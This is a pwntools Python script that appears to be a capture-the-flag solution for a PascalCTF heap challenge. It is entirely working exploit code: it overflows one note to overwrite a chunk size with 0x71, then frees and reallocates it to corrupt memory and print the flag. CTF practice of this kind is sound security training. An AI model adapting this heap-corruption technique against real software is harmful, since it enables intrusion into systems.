#!/usr/bin/env python3

import os
from pwn import *
import logging
logging.disable()

HOST = os.environ.get("HOST", "ahc.ctf.pascalctf.it")
PORT = int(os.environ.get("PORT", 9003))

def main():
   r = remote(HOST, PORT)

   for i in range(5):
      r.sendlineafter(b'> ', b'1')
      r.sendlineafter(b': ', str(i).encode())
      r.sendlineafter(b'? ', b'0')
      
      r.sendlineafter(b'name: ', b'abcd' if i != 3 else b'a'*39)
      r.sendlineafter(b'message: ', b'efgh' if i != 3 else b'b'*32 + b'\x71')
   
   r.sendlineafter(b'> ', b'2')
   r.sendlineafter(b': ', b'4')
   
   r.sendlineafter(b'> ', b'1')
   r.sendlineafter(b': ', b'4')
   r.sendlineafter(b'? ', b'32')
   r.sendlineafter(b'name: ', b'abcd')
   r.sendlineafter(b'message: ', p64(0xdeadbeefcafebabe)*4)
   
   r.sendlineafter(b'> ', b'5')
   r.recvline()
   print(r.recvline().decode().strip())
   
   r.close()

if __name__ == "__main__":
   main()
